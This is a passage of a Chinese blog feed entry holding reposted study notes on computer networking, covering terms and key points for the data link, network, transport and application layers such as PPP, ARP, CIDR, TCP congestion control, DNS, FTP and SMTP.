FTTx</h4><p>用户到互联网的宽带接入方法有非对称数字用户线 ADSL（用数字技术对现有的模拟电话线进行改造，而不需要重新布线。ASDL 的快速版本是甚高速数字用户线 VDSL。），光纤同轴混合网 HFC（是在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网）和 FTTx（即光纤到······）。</p><h2 id="3-数据链路层（Data-Link-Layer）"><a href="#3-数据链路层（Data-Link-Layer）" class="headerlink" title="3. 数据链路层（Data Link Layer）"></a>3. 数据链路层（Data Link Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KyfdFTVYKazEFHWlq5TjQ1nrXKNibicB8Rnl0CWpxjwdZMy7NQ3BicA5Uw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="数据链路层"></p><h3 id="3-1-基本术语"><a href="#3-1-基本术语" class="headerlink" title="3.1. 基本术语"></a>3.1. 基本术语</h3><ol><li><p><strong>链路（link）</strong> ：一个结点到相邻结点的一段物理链路。</p></li><li><p><strong>数据链路（data link）</strong> ：把实现控制数据运输的协议的硬件和软件加到链路上就构成了数据链路。</p></li><li><p><strong>循环冗余检验 CRC（Cyclic Redundancy Check）</strong> ：为了保证数据传输的可靠性，CRC 是数据链路层广泛使用的一种检错技术。</p></li><li><p><strong>帧（frame）</strong> ：一个数据链路层的传输单元，由一个数据链路层首部和其携带的封包所组成协议数据单元。</p></li><li><p><strong>MTU（Maximum Transfer Uint ）</strong> ：最大传送单元。帧的数据部分的的长度上限。</p></li><li><p><strong>误码率 BER（Bit Error Rate ）</strong> ：在一段时间内，传输错误的比特占所传输比特总数的比率。</p></li><li><p><strong>PPP（Point-to-Point Protocol ）</strong> ：点对点协议。即用户计算机和 ISP 进行通信时所使用的数据链路层协议。以下是 PPP 帧的示意图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KcgHcrb0eBKhQpqeYh333QnQWqv9iaicmsibRoWNmZJjXLmaQamIpUicymw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p></li><li><p><strong>MAC 地址（Media Access Control 或者 Medium Access Control）</strong> ：意译为媒体访问控制，或称为物理地址、硬件地址，用来定义网络设备的位置。在 OSI 模型中，第三层网络层负责 IP 地址，第二层数据链路层则负责 MAC 地址。因此一个主机会有一个 MAC 地址，而每个网络位置会有一个专属于它的 IP 地址 。地址是识别某个系统的重要标识符，“名字指出我们所要寻找的资源，地址指出资源所在的地方，路由告诉我们如何到达该处。</p></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KbbMOaYPic0dt4kjLMVrZicwRGkAlcQZvH84PdvKAeBecXh0u0dkzAhibA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="ARP (Address Resolution Protocol) explained"></p><ol><li><strong>网桥（bridge）</strong> ：一种用于数据链路层实现中继，连接两个或多个局域网的网络互连设备。</li><li><strong>交换机（switch ）</strong> ：广义的来说，交换机指的是一种通信系统中完成信息交换的设备。这里工作在数据链路层的交换机指的是交换式集线器，其实质是一个多接口的网桥</li></ol><h3 id="3-2-重要知识点总结"><a href="#3-2-重要知识点总结" class="headerlink" title="3.2. 重要知识点总结"></a>3.2. 重要知识点总结</h3><ol><li>链路是从一个结点到相邻节点的一段物理链路，数据链路则在链路的基础上增加了一些必要的硬件（如网络适配器）和软件（如协议的实现）</li><li>数据链路层使用的主要是<strong>点对点信道</strong>和<strong>广播信道</strong>两种。</li><li>数据链路层传输的协议数据单元是帧。数据链路层的三个基本问题是：<strong>封装成帧</strong>，<strong>透明传输</strong>和<strong>差错检测</strong></li><li><strong>循环冗余检验 CRC</strong> 是一种检错方法，而帧检验序列 FCS 是添加在数据后面的冗余码</li><li><strong>点对点协议 PPP</strong> 是数据链路层使用最多的一种协议，它的特点是：简单，只检测差错而不去纠正差错，不使用序号，也不进行流量控制，可同时支持多种网络层协议</li><li>PPPoE 是为宽带上网的主机使用的链路层协议</li><li><strong>局域网的优点是：具有广播功能，从一个站点可方便地访问全网；便于系统的扩展和逐渐演变；提高了系统的可靠性，可用性和生存性。</strong></li><li>计算机与外接局域网通信需要通过通信适配器（或网络适配器），它又称为网络接口卡或网卡。<strong>计算器的硬件地址就在适配器的 ROM 中</strong>。</li><li>以太网采用的无连接的工作方式，对发送的数据帧不进行编号，也不要求对方发回确认。目的站收到有差错帧就把它丢掉，其他什么也不做</li><li>以太网采用的协议是具有冲突检测的<strong>载波监听多点接入 CSMA/CD</strong>。协议的特点是：<strong>发送前先监听，边发送边监听，一旦发现总线上出现了碰撞，就立即停止发送。然后按照退避算法等待一段随机时间后再次发送。</strong> 因此，每一个站点在自己发送数据之后的一小段时间内，存在这遭遇碰撞的可能性。以太网上的各站点平等的争用以太网信道</li><li>以太网的适配器具有过滤功能，它只接收单播帧，广播帧和多播帧。</li><li>使用集线器可以在物理层扩展以太网（扩展后的以太网仍然是一个网络）</li></ol><h3 id="3-3-补充"><a href="#3-3-补充" class="headerlink" title="3.3. 补充"></a>3.3. 补充</h3><ol><li>数据链路层的点对点信道和广播信道的特点，以及这两种信道所使用的协议（PPP 协议以及 CSMA/CD 协议）的特点</li><li>数据链路层的三个基本问题：<strong>封装成帧</strong>，<strong>透明传输</strong>，<strong>差错检测</strong></li><li>以太网的 MAC 层硬件地址</li><li>适配器，转发器，集线器，网桥，以太网交换机的作用以及适用场合</li></ol><h2 id="4-网络层（Network-Layer）"><a href="#4-网络层（Network-Layer）" class="headerlink" title="4. 网络层（Network Layer）"></a>4. 网络层（Network Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KheCDa24wZ5XBmYdgegDSbnHUib2cFcYr6CEYVyzzMNLJFYzttzFCzIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="网络层"></p><h3 id="4-1-基本术语"><a href="#4-1-基本术语" class="headerlink" title="4.1. 基本术语"></a>4.1. 基本术语</h3><ol><li><strong>虚电路（Virtual Circuit）</strong> : 在两个终端设备的逻辑或物理端口之间，通过建立的双向的透明传输通道。虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。</li><li><strong>IP（Internet Protocol ）</strong> : 网际协议 IP 是 TCP/IP 体系中两个最主要的协议之一，是 TCP/IP 体系结构网际层的核心。配套的有 ARP，RARP，ICMP，IGMP。</li><li><strong>ARP（Address Resolution Protocol）</strong> : 地址解析协议。地址解析协议 ARP 把 IP 地址解析为硬件地址。</li><li><strong>ICMP（Internet Control Message Protocol ）</strong> ：网际控制报文协议 （ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告）。</li><li><strong>子网掩码（subnet mask ）</strong> ：它是一种用来指明一个 IP 地址的哪些位标识的是主机所在的子网以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合 IP 地址一起使用。</li><li>**CIDR（ Classless Inter-Domain Routing ） **：无分类域间路由选择 （特点是消除了传统的 A 类、B 类和 C 类地址以及划分子网的概念，并使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号）。</li><li><strong>默认路由（default route）</strong> ：当在路由表中查不到能到达目的地址的路由时，路由器选择的路由。默认路由还可以减小路由表所占用的空间和搜索路由表所用的时间。</li><li><strong>路由选择算法（Virtual Circuit）</strong> ：路由选择协议的核心部分。因特网采用自适应的，分层次的路由选择协议。</li></ol><h3 id="4-2-重要知识点总结"><a href="#4-2-重要知识点总结" class="headerlink" title="4.2. 重要知识点总结"></a>4.2. 重要知识点总结</h3><ol><li><strong>TCP/IP 协议中的网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。网络层不提供服务质量的承诺，不保证分组交付的时限所传送的分组可能出错，丢失，重复和失序。进程之间通信的可靠性由运输层负责</strong></li><li>在互联网的交付有两种，一是在本网络直接交付不用经过路由器，另一种是和其他网络的间接交付，至少经过一个路由器，但最后一次一定是直接交付</li><li>分类的 IP 地址由网络号字段（指明网络）和主机号字段（指明主机）组成。网络号字段最前面的类别指明 IP 地址的类别。IP 地址是一种分等级的地址结构。IP 地址管理机构分配 IP 地址时只分配网络号，主机号由得到该网络号的单位自行分配。路由器根据目的主机所连接的网络号来转发分组。一个路由器至少连接到两个网络，所以一个路由器至少应当有两个不同的 IP 地址</li><li>IP 数据报分为首部和数据两部分。首部的前一部分是固定长度，共 20 字节，是所有 IP 数据包必须具有的（源地址，目的地址，总长度等重要地段都固定在首部）。一些长度可变的可选字段固定在首部的后面。IP 首部中的生存时间给出了 IP 数据报在互联网中所能经过的最大路由器数。可防止 IP 数据报在互联网中无限制的兜圈子。</li><li><strong>地址解析协议 ARP 把 IP 地址解析为硬件地址。ARP 的高速缓存可以大大减少网络上的通信量。因为这样可以使主机下次再与同样地址的主机通信时，可以直接从高速缓存中找到所需要的硬件地址而不需要再去广播方式发送 ARP 请求分组</strong></li><li>无分类域间路由选择 CIDR 是解决目前 IP 地址紧缺的一个好办法。CIDR 记法把 IP 地址后面加上斜线“/”，然后写上前缀所所占的位数。前缀（或网络前缀用来指明网络），前缀后面的部分是后缀，用来指明主机。CIDR 把前缀都相同的连续的 IP 地址组成一个“CIDR 地址块”，IP 地址分配都以 CIDR 地址块为单位。</li><li>网际控制报文协议是 IP 层的协议。ICMP 报文作为 IP 数据报的数据，加上首部后组成 IP 数据报发送出去。使用 ICMP 数据报并不是为了实现可靠传输。ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。ICMP 报文的种类有两种 ICMP 差错报告报文和 ICMP 询问报文。</li><li><strong>要解决 IP 地址耗尽的问题，最根本的办法是采用具有更大地址空间的新版本 IP 协议-IPv6。</strong> IPv6 所带来的变化有 ① 更大的地址空间（采用 128 位地址）② 灵活的首部格式 ③ 改进的选项 ④ 支持即插即用 ⑤ 支持资源的预分配 ⑥IPv6 的首部改为 8 字节对齐。</li><li><strong>虚拟专用网络 VPN 利用公用的互联网作为本机构专用网之间的通信载体。VPN 内使用互联网的专用地址。一个 VPN 至少要有一个路由器具有合法的全球 IP 地址，这样才能和本系统的另一个 VPN 通过互联网进行通信。所有通过互联网传送的数据都需要加密。</strong></li><li>MPLS 的特点是：① 支持面向连接的服务质量 ② 支持流量工程，平衡网络负载 ③ 有效的支持虚拟专用网 VPN。MPLS 在入口节点给每一个 IP 数据报打上固定长度的“标记”，然后根据标记在第二层（链路层）用硬件进行转发（在标记交换路由器中进行标记交换），因而转发速率大大加快。</li></ol><h2 id="5-传输层（Transport-Layer）"><a href="#5-传输层（Transport-Layer）" class="headerlink" title="5. 传输层（Transport Layer）"></a>5. 传输层（Transport Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KoHBD0X9EMw9t3oPz1tDEHiaSqibTibJNfOicXfEZiaib61WSMLuP4smoiaB6g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="传输层"></p><h3 id="5-1-基本术语"><a href="#5-1-基本术语" class="headerlink" title="5.1. 基本术语"></a>5.1. 基本术语</h3><ol><li><strong>进程（process）</strong> ：指计算机中正在运行的程序实体。</li><li><strong>应用进程互相通信</strong> ：一台主机的进程和另一台主机中的一个进程交换数据的过程（另外注意通信真正的端点不是主机而是主机中的进程，也就是说端到端的通信是应用进程之间的通信）。</li><li><strong>传输层的复用与分用</strong> ：复用指发送方不同的进程都可以通过统一个运输层协议传送数据。分用指接收方的运输层在剥去报文的首部后能把这些数据正确的交付到目的应用进程。</li><li><strong>TCP（Transmission Control Protocol）</strong> ：传输控制协议。</li><li><strong>UDP（User Datagram Protocol）</strong> ：用户数据报协议。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K5WSJtMImibp4CUwlNA0rsoSUrYe0DsBwWic3FiaYKjO9meXcB2tT0qiblQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="TCP和UDP"></p><ol><li>**端口（port） ** ：端口的目的是为了确认对方机器是那个进程在于自己进行交互，比如 MSN 和 QQ 的端口不同，如果没有端口就可能出现 QQ 进程和 MSN 交互错误。端口又称协议端口号。</li><li><strong>停止等待协议（stop-and-wait）</strong> ：指发送方每发送完一个分组就停止发送，等待对方确认，在收到确认之后在发送下一个分组。</li><li><strong>流量控制</strong> : 就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。</li><li><strong>拥塞控制</strong> ：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。</li></ol><h3 id="5-2-重要知识点总结"><a href="#5-2-重要知识点总结" class="headerlink" title="5.2. 重要知识点总结"></a>5.2. 重要知识点总结</h3><ol><li><strong>运输层提供应用进程之间的逻辑通信，也就是说，运输层之间的通信并不是真正在两个运输层之间直接传输数据。运输层向应用层屏蔽了下面网络的细节（如网络拓补，所采用的路由选择协议等），它使应用进程之间看起来好像两个运输层实体之间有一条端到端的逻辑通信信道。</strong></li><li><strong>网络层为主机提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信。</strong></li><li>运输层的两个重要协议是用户数据报协议 UDP 和传输控制协议 TCP。按照 OSI 的术语，两个对等运输实体在通信时传送的数据单位叫做运输协议数据单元 TPDU（Transport Protocol Data Unit）。但在 TCP/IP 体系中，则根据所使用的协议是 TCP 或 UDP，分别称之为 TCP 报文段或 UDP 用户数据报。</li><li><strong>UDP 在传送数据之前不需要先建立连接，远地主机在收到 UDP 报文后，不需要给出任何确认。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 确是一种最有效的工作方式。TCP 提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP 不提供广播或多播服务。由于 TCP 要提供可靠的，面向连接的传输服务，这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。</strong></li><li>硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层各种协议进程与运输实体进行层间交互的一种地址。UDP 和 TCP 的首部格式中都有源端口和目的端口这两个重要字段。当运输层收到 IP 层交上来的运输层报文时，就能够 根据其首部中的目的端口号把数据交付应用层的目的应用层。（两个进程之间进行通信不光要知道对方 IP 地址而且要知道对方的端口号(为了找到对方计算机中的应用进程)）</li><li>运输层用一个 16 位端口号标志一个端口。端口号只有本地意义，它只是为了标志计算机应用层中的各个进程在和运输层交互时的层间接口。在互联网的不同计算机中，相同的端口号是没有关联的。协议端口号简称端口。虽然通信的终点是应用进程，但只要把所发送的报文交到目的主机的某个合适端口，剩下的工作（最后交付目的进程）就由 TCP 和 UDP 来完成。</li><li>运输层的端口号分为服务器端使用的端口号（0<del>1023 指派给熟知端口，1024</del>49151 是登记端口号）和客户端暂时使用的端口号（49152~65535）</li><li><strong>UDP 的主要特点是 ① 无连接 ② 尽最大努力交付 ③ 面向报文 ④ 无拥塞控制 ⑤ 支持一对一，一对多，多对一和多对多的交互通信 ⑥ 首部开销小（只有四个字段：源端口，目的端口，长度和检验和）</strong></li><li><strong>TCP 的主要特点是 ① 面向连接 ② 每一条 TCP 连接只能是一对一的 ③ 提供可靠交付 ④ 提供全双工通信 ⑤ 面向字节流</strong></li><li><strong>TCP 用主机的 IP 地址加上主机上的端口号作为 TCP 连接的端点。这样的端点就叫做套接字（socket）或插口。套接字用（IP 地址：端口号）来表示。每一条 TCP 连接唯一被通信两端的两个端点所确定。</strong></li><li>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</li><li>为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用流水线传输。流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停下来等待对方确认。这样可使信道上一直有数据不间断的在传送。这种传输方式可以明显提高信道利用率。</li><li>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求 ARQ。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</li><li>TCP 报文段的前 20 个字节是固定的，后面有 4n 字节是根据需要增加的选项。因此，TCP 首部的最小长度是 20 字节。</li><li><strong>TCP 使用滑动窗口机制。发送窗口里面的序号表示允许发送的序号。发送窗口后沿的后面部分表示已发送且已收到确认，而发送窗口前沿的前面部分表示不允许发送。发送窗口后沿的变化情况有两种可能，即不动（没有收到新的确认）和前移（收到了新的确认）。发送窗口的前沿通常是不断向前移动的。一般来说，我们总是希望数据传输更快一些。但如果发送方把数据发送的过快，接收方就可能来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。</strong></li><li>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</li><li><strong>为了进行拥塞控制，TCP 发送方要维持一个拥塞窗口 cwnd 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</strong></li><li><strong>TCP 的拥塞控制采用了四种算法，即慢开始，拥塞避免，快重传和快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</strong></li><li>运输连接的三个阶段，即：连接建立，数据传送和连接释放。</li><li><strong>主动发起 TCP 连接建立的应用进程叫做客户，而被动等待连接建立的应用进程叫做服务器。TCP 连接采用三报文握手机制。服务器要确认用户的连接请求，然后客户要对服务器的确认进行确认。</strong></li><li>TCP 的连接释放采用四报文握手机制。任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送时，则发送连接释放通知，对方确认后就完全关闭了 TCP 连接</li></ol><h3 id="5-3-补充（重要）"><a href="#5-3-补充（重要）" class="headerlink" title="5.3. 补充（重要）"></a>5.3. 补充（重要）</h3><p>以下知识点需要重点关注：</p><ol><li>端口和套接字的意义</li><li>UDP 和 TCP 的区别以及两者的应用场景</li><li>在不可靠的网络上实现可靠传输的工作原理，停止等待协议和 ARQ 协议</li><li>TCP 的滑动窗口，流量控制，拥塞控制和连接管理</li><li>TCP 的三次握手，四次挥手机制</li></ol><h2 id="6-应用层（Application-Layer）"><a href="#6-应用层（Application-Layer）" class="headerlink" title="6. 应用层（Application Layer）"></a>6. 应用层（Application Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Ke33HT18JEZTyPFrStiaMHdWs7a7T07CIbdLryJoCJMZ5f83Ltug9Mlw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="应用层"></p><h3 id="6-1-基本术语"><a href="#6-1-基本术语" class="headerlink" title="6.1. 基本术语"></a>6.1. 基本术语</h3><ol><li><strong>域名系统（DNS）</strong> ：域名系统（DNS，Domain Name System）将人类可读的域名 (例如，<a href="http://www.baidu.com/">www.baidu.com</a>) 转换为机器可读的 IP 地址 (例如，220.181.38.148)。我们可以将其理解为专为互联网设计的电话薄。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KGmT3bbwRxUcDUnW3FGTuJyDFJeQoztiaqdafsrxVr6QmmcU6UnngIEA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p><a href="https://www.seobility.net/en/wiki/HTTP_headers">https://www.seobility.net/en/wiki/HTTP_headers</a></p><ol><li><strong>文件传输协议（FTP）</strong> ：FTP 是 File TransferProtocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于 Internet 上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的 FTP 应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在 FTP 的使用当中，用户经常遇到两个概念：”下载”（Download）和”上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上；”上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用 Internet 语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KoyZl04PDhEBgdCSWUVej9SCYvnJEufWlZBIwOAtm5Jlzs54ficyU5WA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="FTP工作过程"></p><ol><li><strong>简单文件传输协议（TFTP）</strong> ：TFTP（Trivial File Transfer Protocol,简单文件传输协议）是 TCP/IP 协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。端口号为 69。</li><li><strong>远程终端协议（TELENET）</strong> ：Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用 telnet 程序，用它连接到服务器。终端使用者可以在 telnet 程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet 会话，必须输入用户名和密码来登录服务器。Telnet 是常用的远程控制 Web 服务器的方法。</li><li><strong>万维网（WWW）</strong> ：WWW 是环球信息网的缩写，（亦作“Web”、“WWW”、“’W3’”，英文全称为“World Wide Web”），中文名字为“万维网”，”环球网”等，常简称为 Web。分为 Web 客户端和 Web 服务器程序。WWW 可以让 Web 客户端（常用浏览器）访问浏览 Web 服务器上的页面。是一个由许多互相链接的超文本组成的系统，通过互联网访问。在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URI）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。万维网联盟（英语：World Wide Web Consortium，简称 W3C），又称 W3C 理事会。1994 年 10 月在麻省理工学院（MIT）计算机科学实验室成立。万维网联盟的创建者是万维网的发明者蒂姆·伯纳斯-李。万维网并不等同互联网，万维网只是互联网所能提供的服务其中之一，是靠着互联网运行的一项服务。</li><li><strong>万维网的大致工作工程：</strong></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KtdIowP6M0tWZhaRlF8icddPztoaDnXhGDJXP0Q13e3lG0wmepfU7AQQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="万维网的大致工作工程"></p><ol><li><strong>统一资源定位符（URL）</strong> ：统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的 URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</li><li><strong>超文本传输协议（HTTP）</strong> ：超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的 WWW 文件都必须遵守这个标准。设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。1960 年美国人 Ted Nelson 构思了一种通过计算机处理文本信息的方法，并称之为超文本（hypertext）,这成为了 HTTP 超文本传输协议标准架构的发展根基。</li></ol><p>HTTP 协议的本质就是一种浏览器与服务器之间约定好的通信格式。HTTP 的原理如下图所示：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K5y5tH02HtyI4D0icvNjlcoH9qxOiaMibjdgkVu8YB6ZXl7BoslFic7l5sQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>代理服务器（Proxy Server）</strong> ：代理服务器（Proxy Server）是一种网络实体，它又称为万维网高速缓存。代理服务器把最近的一些请求和响应暂存在本地磁盘中。当新请求到达时，若代理服务器发现这个请求与暂时存放的的请求相同，就返回暂存的响应，而不需要按 URL 的地址再次去互联网访问该资源。代理服务器可在客户端或服务器工作，也可以在中间系统工作。</li><li><strong>简单邮件传输协议(SMTP)</strong> : SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过 SMTP 协议所指定的服务器,就可以把 E-mail 寄到收信人的服务器上了，整个过程只要几分钟。SMTP 服务器则是遵循 SMTP 协议的发送邮件服务器，用来发送或中转发出的电子邮件。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KibGIaIUian9kArCrxV65TBdbWeY7w3rgtlroia7KhtRbic3e8GlyYsZHbg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="一个电子邮件被发送的过程"></p><p><a href="https://www.campaignmonitor.com/resources/knowledge-base/what-is-the-code-that-makes-bcc-or-cc-operate-in-an-email/">https://www.campaignmonitor.com/resources/knowledge-base/what-is-the-code-that-makes-bcc-or-cc-operate-in-an-email/</a></p><ol><li><strong>搜索引擎</strong> :搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KAdo3NwVkz5KOWB2Pht1bVO74ltib8C29xqHiabCYJiaUIJehjLsVI4r9w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="搜索引擎"></p><ol><li><strong>垂直搜索引擎</strong> ：垂直搜索引擎是针对某一个行业的专业搜索引擎，是搜索引擎的细分和延伸，是对网页库中的某类专门的信息进行一次整合，定向分字段抽取出需要的数据进行处理后再以某种形式返回给用户。垂直搜索是相对通用搜索引擎的信息量大、查询不准确、深度不够等提出来的新的搜索引擎服务模式，通过针对某一特定领域、某一特定人群或某一特定需求提供的有一定价值的信息和相关服务。其特点就是“专、精、深”，且具有行业色彩，相比较通用搜索引擎的海量信息无序化，垂直搜索引擎则显得更加专注、具体和深入。</li><li><strong>全文索引</strong> :全文索引技术是目前搜索引擎的关键技术。试想在 1M 大小的文件中搜索一个词，可能需要几秒，在 100M 的文件中可能需要几十秒，如果在更大的文件中搜索那么就需要更大的系统开销，这样的开销是不现实的。所以在这样的矛盾下出现了全文索引技术，有时候有人叫倒排文档技术。</li><li><strong>目录索引</strong> ：目录索引（ search index/directory)，顾名思义就是将网站分门别类地存放在相应的目录中，因此用户在查询信息时，可选择关键词搜索，也可按分类目录逐层查找。</li></ol><h3 id="6-2-重要知识点总结"><a href="#6-2-重要知识点总结" class="headerlink" title="6.2. 重要知识点总结"></a>6.2. 重要知识点总结</h3><ol><li>文件传输协议（FTP）使用 TCP 可靠的运输服务。FTP 使用客户服务器方式。一个 FTP 服务器进程可以同时为多个用户提供服务。在进进行文件传输时，FTP 的客户和服务器之间要先建立两个并行的 TCP 连接:控制连接和数据连接。实际用于传输文件的是数据连接。</li><li>万维网客户程序与服务器之间进行交互使用的协议是超文本传输协议 HTTP。HTTP 使用 TCP 连接进行可靠传输。但 HTTP 本身是无连接、无状态的。HTTP/1.1 协议使用了持续连接（分为非流水线方式和流水线方式）</li><li>电子邮件把邮件发送到收件人使用的邮件服务器，并放在其中的收件人邮箱中，收件人可随时上网到自己使用的邮件服务器读取，相当于电子邮箱。</li><li>一个电子邮件系统有三个重要组成构件：用户代理、邮件服务器、邮件协议（包括邮件发送协议，如 SMTP，和邮件读取协议，如 POP3 和 IMAP）。用户代理和邮件服务器都要运行这些协议。</li></ol><h3 id="6-3-补充（重要）"><a href="#6-3-补充（重要）" class="headerlink" title="6.3. 补充（重要）"></a>6.3. 补充（重要）</h3><p>以下知识点需要重点关注：</p><ol><li>应用层的常见协议（重点关注 HTTP 协议）</li><li>域名系统-从域名解析出 IP 地址</li><li>访问一个网站大致的过程</li><li>系统调用和应用编程接口概念</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;转自公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/6ju4j_ffLuOBuoO53ZhcOA&quot;&gt;JavaGuide:大二逃课总结1.2w字的计算机网络知识&lt;/a&gt; 。供之后复习用。&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="https://www.fvolcano.red/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>if-else的优化</title>
    <link href="https://www.fvolcano.red/2020/ultimazation-of-ifelse/"/>
